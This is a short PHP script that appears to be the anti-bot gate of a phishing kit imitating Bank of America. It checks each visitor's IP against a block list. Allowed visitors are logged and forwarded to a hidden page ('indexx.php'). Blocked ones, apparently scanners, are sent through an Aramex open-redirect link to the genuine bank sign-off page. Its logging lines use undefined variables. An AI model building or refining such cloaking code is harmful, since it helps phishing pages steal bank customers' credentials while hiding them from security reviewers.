<?php

require_once("assets/includes/functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'], );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("indexx.php");
	}

	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://www.aramex.com/ec/link.aspx?c=3388&r=486310&t=https://www.bankofamerica.com/?page_msg=signoff&request_locale=en_us");
		die();
	}
}
?>